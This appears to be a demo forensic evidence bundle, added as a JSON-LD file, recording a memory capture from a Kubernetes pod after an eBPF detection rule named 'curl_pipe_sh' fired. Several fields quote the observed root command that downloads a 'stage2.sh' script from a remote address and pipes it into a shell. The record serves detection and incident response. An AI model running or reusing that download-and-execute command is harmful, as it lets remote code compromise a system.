@@ -1,0 +1,408 @@
+{
+  "@context": {
+    "case-core": "https://ontology.caseontology.org/case/core/",
+    "case-investigation": "https://ontology.caseontology.org/case/investigation/",
+    "fr": "https://flightrecorder.dev/ontology/2026/01#",
+    "kb": "http://example.org/kb/",
+    "uco-action": "https://ontology.unifiedcyberontology.org/uco/action/",
+    "uco-core": "https://ontology.unifiedcyberontology.org/uco/core/",
+    "uco-identity": "https://ontology.unifiedcyberontology.org/uco/identity/",
+    "uco-observable": "https://ontology.unifiedcyberontology.org/uco/observable/",
+    "uco-tool": "https://ontology.unifiedcyberontology.org/uco/tool/",
+    "uco-types": "https://ontology.unifiedcyberontology.org/uco/types/",
+    "uco-vocabulary": "https://ontology.unifiedcyberontology.org/uco/vocabulary/",
+    "xsd": "http://www.w3.org/2001/XMLSchema#"
+  },
+  "@id": "kb:bundle-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+  "@type": "uco-core:Bundle",
+  "uco-core:name": "Flight Recorder capture c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+  "uco-core:description": "Volatile memory preserved from pod victim/victim-app-7d9f8b6c5-x2kqp (container 3f2b1c0d9e8a) after trigger \"curl_pipe_sh\"",
+  "uco-core:createdTime": {
+    "@type": "xsd:dateTime",
+    "@value": "2026-08-19T06:17:01.2560652Z"
+  },
+  "case-core:specVersion": "1.3.0",
+  "@graph": [
+    {
+      "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-observable:ObservableObject",
+      "fr:classification": "CONFIDENTIAL",
+      "uco-core:description": "Volatile memory acquired from pod victim/victim-app-7d9f8b6c5-x2kqp (container 3f2b1c0d9e8a) via process_vm_readv without suspending the target",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-content-facet",
+          "@type": "uco-observable:ContentDataFacet",
+          "fr:compression": "zstd-3",
+          "uco-observable:hash": [
+            {
+              "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-hash",
+              "@type": "uco-types:Hash",
+              "uco-types:hashMethod": {
+                "@type": "uco-vocabulary:HashNameVocab",
+                "@value": "SHA256"
+              },
+              "uco-types:hashValue": {
+                "@type": "xsd:hexBinary",
+                "@value": "DA764923EA139EAD589648FD743D9C0C9B3A418C2E3B31F375B982E186966A6A"
+              }
+            }
+          ],
+          "uco-observable:isEncrypted": {
+            "@type": "xsd:boolean",
+            "@value": "true"
+          },
+          "uco-observable:mimeType": "application/octet-stream",
+          "uco-observable:sizeInBytes": {
+            "@type": "xsd:integer",
+            "@value": "262144"
+          }
+        },
+        {
+          "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-file-facet",
+          "@type": "uco-observable:FileFacet",
+          "uco-observable:fileName": "dump.bin.zst.enc",
+          "uco-observable:filePath": "C:\\fr-demo\\final\\evidence/c5cbd72c-9d1a-48d5-8241-0127a9d020b1/dump.bin.zst.enc",
+          "uco-observable:observableCreatedTime": {
+            "@type": "xsd:dateTime",
+            "@value": "2026-08-19T06:17:01.238571Z"
+          },
+          "uco-observable:sizeInBytes": {
+            "@type": "xsd:integer",
+            "@value": "262144"
+          }
+        },
+        {
+          "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-acquisition-facet",
+          "@type": "fr:MemoryAcquisitionFacet",
+          "fr:acquisitionMethod": "process_vm_readv(2)",
+          "fr:captureStatus": "complete",
+          "fr:failedRegions": {
+            "@type": "xsd:integer",
+            "@value": "0"
+          },
+          "fr:fullRegions": {
+            "@type": "xsd:integer",
+            "@value": "2"
+          },
+          "fr:partialRegions": {
+            "@type": "xsd:integer",
+            "@value": "0"
+          },
+          "fr:redactionApplied": {
+            "@type": "xsd:boolean",
+            "@value": "false"
+          },
+          "fr:regionCount": {
+            "@type": "xsd:integer",
+            "@value": "2"
+          },
+          "fr:skippedRegions": {
+            "@type": "xsd:integer",
+            "@value": "0"
+          },
+          "fr:targetProcessStopped": {
+            "@type": "xsd:boolean",
+            "@value": "false"
+          }
+        }
+      ],
+      "uco-core:name": "Process memory dump (pid 48291)",
+      "uco-core:tag": [
+        "CONFIDENTIAL"
+      ]
+    },
+    {
+      "@id": "kb:binary-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-observable:File",
+      "uco-core:description": "Binary image passed to execve",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:binary-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-facet",
+          "@type": "uco-observable:FileFacet",
+          "uco-observable:fileName": "sh",
+          "uco-observable:filePath": "/usr/bin/sh"
+        }
+      ],
+      "uco-core:name": "sh"
+    },
+    {
+      "@id": "kb:process-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-observable:Process",
+      "uco-core:description": "Process observed executing \"/usr/bin/sh -c curl -s http://198.51.100.23/stage2.sh | sh\"",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:process-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-facet",
+          "@type": "uco-observable:ProcessFacet",
+          "uco-observable:arguments": [
+            "/usr/bin/sh",
+            "-c",
+            "curl -s http://198.51.100.23/stage2.sh | sh"
+          ],
+          "uco-observable:binary": {
+            "@id": "kb:binary-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+          },
+          "uco-observable:observableCreatedTime": {
+            "@type": "xsd:dateTime",
+            "@value": "2026-08-19T06:17:01.058571Z"
+          },
+          "uco-observable:pid": {
+            "@type": "xsd:integer",
+            "@value": "48291"
+          }
+        },
+        {
+          "@id": "kb:process-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-namespace-facet",
+          "@type": "fr:ProcessNamespaceFacet",
+          "fr:cgroupID": {
+            "@type": "xsd:integer",
+            "@value": "91237845"
+          },
+          "fr:comm": "sh",
+          "fr:commandLine": "/usr/bin/sh -c curl -s http://198.51.100.23/stage2.sh | sh",
+          "fr:hostPID": {
+            "@type": "xsd:integer",
+            "@value": "48291"
+          },
+          "fr:namespacePID": {
+            "@type": "xsd:integer",
+            "@value": "1"
+          },
+          "fr:uid": {
+            "@type": "xsd:integer",
+            "@value": "0"
+          }
+        }
+      ],
+      "uco-core:name": "sh"
+    },
+    {
+      "@id": "kb:container-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-observable:ObservableObject",
+      "uco-core:description": "Container that hosted the observed process",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:container-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-facet",
+          "@type": "fr:ContainerFacet",
+          "fr:cgroupPath": "",
+          "fr:containerID": "3f2b1c0d9e8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c",
+          "fr:nodeName": "demo-node",
+          "fr:podName": "victim-app-7d9f8b6c5-x2kqp",
+          "fr:podNamespace": "victim",
+          "fr:podUID": "",
+          "fr:runtime": "containerd"
+        }
+      ],
+      "uco-core:name": "victim/victim-app-7d9f8b6c5-x2kqp"
+    },
+    {
+      "@id": "kb:trigger-event-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-observable:ObservableObject",
+      "uco-core:description": "execve observed by tracepoint/syscalls/sys_enter_execve matched rule \"curl_pipe_sh\"",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:trigger-event-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-facet",
+          "@type": "fr:TriggerFacet",
+          "fr:clockSource": "CLOCK_BOOTTIME (bpf_ktime_get_boot_ns)",
+          "fr:commandLine": "/usr/bin/sh -c curl -s http://198.51.100.23/stage2.sh | sh",
+          "fr:mitreTechnique": "T1059.004",
+          "fr:observedTime": {
+            "@type": "xsd:dateTime",
+            "@value": "2026-08-19T06:17:01.058571Z"
+          },
+          "fr:probe": "tracepoint/syscalls/sys_enter_execve",
+          "fr:ruleName": "curl_pipe_sh",
+          "fr:severity": "critical"
+        }
+      ],
+      "uco-core:name": "eBPF trigger event"
+    },
+    {
+      "@id": "kb:tool-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-tool:Tool",
+      "uco-core:description": "eBPF-triggered volatile memory preservation for ephemeral compute",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:tool-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-build-facet",
+          "@type": "fr:BuildFacet",
+          "fr:binarySHA256": "4269f46ce25acb2e05359eba4b54f74b6fdf7a6692d46c4d4bc4726bc1db783e",
+          "fr:commit": "d68fe7f1ec5501336ddea2d8a8b5aca0dc621fc3",
+          "fr:kernelVersion": "windows-amd64",
+          "fr:nodeName": "demo-node"
+        }
+      ],
+      "uco-core:name": "flight-recorder",
+      "uco-tool:toolType": "Forensic Capture Tool",
+      "uco-tool:version": "0.1.0-dev"
+    },
+    {
+      "@id": "kb:performer-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-identity:Identity",
+      "uco-core:description": "Identity responsible for the acquisition (service account when automated)",
+      "uco-core:name": "demo"
+    },
+    {
+      "@id": "kb:investigative-action-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "case-investigation:InvestigativeAction",
+      "case-investigation:endedTime": {
+        "@type": "xsd:dateTime",
+        "@value": "2026-08-19T06:17:01.238571Z"
+      },
+      "case-investigation:startedTime": {
+        "@type": "xsd:dateTime",
+        "@value": "2026-08-19T06:17:01.058571Z"
+      },
+      "fr:acquisitionLatencyMS": {
+        "@type": "xsd:decimal",
+        "@value": "180.000"
+      },
+      "uco-action:endTime": {
+        "@type": "xsd:dateTime",
+        "@value": "2026-08-19T06:17:01.238571Z"
+      },
+      "uco-action:instrument": {
+        "@id": "kb:tool-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-action:object": [
+        {
+          "@id": "kb:process-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+        },
+        {
+          "@id": "kb:trigger-event-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+        }
+      ],
+      "uco-action:performer": {
+        "@id": "kb:performer-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-action:result": [
+        {
+          "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+        }
+      ],
+      "uco-action:startTime": {
+        "@type": "xsd:dateTime",
+        "@value": "2026-08-19T06:17:01.058571Z"
+      },
+      "uco-core:description": "Triggered acquisition of process memory following rule \"curl_pipe_sh\"",
+      "uco-core:name": "Volatile memory acquisition"
+    },
+    {
+      "@id": "kb:provenance-record-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "case-investigation:ProvenanceRecord",
+      "case-investigation:exhibitNumber": "c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "uco-core:description": "Merkle tree over 4 KiB chunks of the acquired memory, root signed with ECDSA P-256",
+      "uco-core:hasFacet": [
+        {
+          "@id": "kb:provenance-record-c5cbd72c-9d1a-48d5-8241-0127a9d020b1-facet",
+          "@type": "fr:SealFacet",
+          "fr:merkleChunkBytes": {
+            "@type": "xsd:integer",
+            "@value": "4096"
+          },
+          "fr:merkleHashFunction": "SHA-256",
+          "fr:merkleLeafCount": {
+            "@type": "xsd:integer",
+            "@value": "64"
+          },
+          "fr:merkleRoot": "9c3c686c0a888bd667d596bce6fedf32eb8f1ea454fbd75cc49fa56f4234c88b",
+          "fr:merkleTreeDepth": {
+            "@type": "xsd:integer",
+            "@value": "7"
+          },
+          "fr:oddLeafPolicy": "duplicate_last",
+          "fr:sealDurationMS": {
+            "@type": "xsd:decimal",
+            "@value": "0.514"
+          },
+          "fr:sealTime": {
+            "@type": "xsd:dateTime",
+            "@value": "2026-08-19T06:17:01.2560652Z"
+          },
+          "fr:signature": "304402201cfea2d1ea9fbcce07bf84bef5d0b1e6eed77d211b3371496729e15d9292db3b022045eaeabfb347d80c7cdbd8c4ab17376d141152c02f48a9521c95d503d46c761b",
+          "fr:signatureAlgorithm": "ecdsa-p256-sha256-asn1",
+          "fr:signerKeyID": "50aa2972032ad873617bf00d411482534061a430d11137b6b1268833c87cccc2"
+        }
+      ],
+      "uco-core:name": "Cryptographic seal",
+      "uco-core:object": [
+        {
+          "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+        }
+      ]
+    },
+    {
+      "@id": "kb:rel-produced-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-core:Relationship",
+      "uco-core:isDirectional": {
+        "@type": "xsd:boolean",
+        "@value": "true"
+      },
+      "uco-core:kindOfRelationship": "Produced",
+      "uco-core:source": {
+        "@id": "kb:investigative-action-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-core:target": {
+        "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      }
+    },
+    {
+      "@id": "kb:rel-used-tool-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-core:Relationship",
+      "uco-core:isDirectional": {
+        "@type": "xsd:boolean",
+        "@value": "true"
+      },
+      "uco-core:kindOfRelationship": "Used",
+      "uco-core:source": {
+        "@id": "kb:investigative-action-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-core:target": {
+        "@id": "kb:tool-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      }
+    },
+    {
+      "@id": "kb:rel-authenticates-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-core:Relationship",
+      "uco-core:isDirectional": {
+        "@type": "xsd:boolean",
+        "@value": "true"
+      },
+      "uco-core:kindOfRelationship": "Authenticates",
+      "uco-core:source": {
+        "@id": "kb:provenance-record-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-core:target": {
+        "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      }
+    },
+    {
+      "@id": "kb:rel-extracted-from-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-core:Relationship",
+      "uco-core:isDirectional": {
+        "@type": "xsd:boolean",
+        "@value": "true"
+      },
+      "uco-core:kindOfRelationship": "Extracted_From",
+      "uco-core:source": {
+        "@id": "kb:memory-dump-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-core:target": {
+        "@id": "kb:process-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      }
+    },
+    {
+      "@id": "kb:rel-contained-within-c5cbd72c-9d1a-48d5-8241-0127a9d020b1",
+      "@type": "uco-core:Relationship",
+      "uco-core:isDirectional": {
+        "@type": "xsd:boolean",
+        "@value": "true"
+      },
+      "uco-core:kindOfRelationship": "Contained_Within",
+      "uco-core:source": {
+        "@id": "kb:process-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      },
+      "uco-core:target": {
+        "@id": "kb:container-c5cbd72c-9d1a-48d5-8241-0127a9d020b1"
+      }
+    }
+  ]
+}
